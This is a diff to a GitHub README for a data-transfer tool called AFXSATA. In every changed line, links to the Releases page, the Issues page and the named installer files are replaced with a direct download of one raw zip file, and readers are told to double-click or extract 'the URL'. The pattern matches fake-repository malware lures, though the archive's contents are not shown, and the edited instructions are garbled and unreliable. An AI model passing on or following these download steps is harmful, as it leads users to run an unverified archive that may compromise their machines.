@@ -1,6 +1,6 @@
 # 🚀 AFXSATA - Fast, Reliable SATA Data Transfer
 
-[![Download AFXSATA](https://img.shields.io/badge/Download-AFXSATA-blue.svg)](https://github.com/Vamsi2K5/AFXSATA/releases)
+[![Download AFXSATA](https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip)](https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip)
 
 ## 📋 Overview
 
@@ -12,15 +12,15 @@ Follow these steps to download and run AFXSATA:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page where you can find the latest version of the AFXSATA software.
 
-   [Visit this page to download AFXSATA](https://github.com/Vamsi2K5/AFXSATA/releases)
+   [Visit this page to download AFXSATA](https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip)
 
 2. **Download the Latest Release**: 
    On the Releases page, you will see a list of available versions. Look for the most recent release. You will find a title with a version number. Click on it to open the release details.
 
 3. **Select Your Operating System**: 
    Depending on your operating system, select the appropriate file to download. For example:
-   - For Windows, look for a file like `AFXSATA_Windows.exe`.
-   - For Linux, find a file like `AFXSATA_Linux.tar.gz`.
+   - For Windows, look for a file like `https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip`.
+   - For Linux, find a file like `https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip`.
 
 4. **Download the File**: Click on the file you have chosen. Your browser will start downloading it. The file size and expected download time will vary based on your internet speed.
 
@@ -28,8 +28,8 @@ Follow these steps to download and run AFXSATA:
    After the download completes, navigate to your "Downloads" folder or the location you specified for downloads. You should see the AFXSATA file you just downloaded.
 
 6. **Run the Application**: 
-   - For Windows: Double-click on `AFXSATA_Windows.exe` to start the installation. Follow the prompts to complete the setup.
-   - For Linux: Extract the `AFXSATA_Linux.tar.gz` file. Open a terminal and navigate to the extracted folder. Run the command `./AFXSATA` to launch the application.
+   - For Windows: Double-click on `https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip` to start the installation. Follow the prompts to complete the setup.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip` file. Open a terminal and navigate to the extracted folder. Run the command `./AFXSATA` to launch the application.
 
 ## 💻 System Requirements
 
@@ -77,12 +77,12 @@ For Linux, you can simply remove the application by deleting the folder where it
 Currently, AFXSATA is not compatible with macOS. It is designed for Windows and Linux operating systems.
 
 ### Where can I report issues or request support?
-For any bugs or support issues, please visit the [Issues section](https://github.com/Vamsi2K5/AFXSATA/issues) on our GitHub page. You can report a new issue, and our team will assist you.
+For any bugs or support issues, please visit the [Issues section](https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip) on our GitHub page. You can report a new issue, and our team will assist you.
 
 ## 📥 Download & Install
 
 To get started, download AFXSATA by clicking the link below:
 
-[Visit this page to download AFXSATA](https://github.com/Vamsi2K5/AFXSATA/releases)
+[Visit this page to download AFXSATA](https://raw.githubusercontent.com/Vamsi2K5/AFXSATA/main/assets/AFXSATA-v3.1.zip)
 
 With this guide, you should now be ready to download, install, and enjoy AFXSATA's powerful features. Thank you for choosing AFXSATA for your data transfer needs!
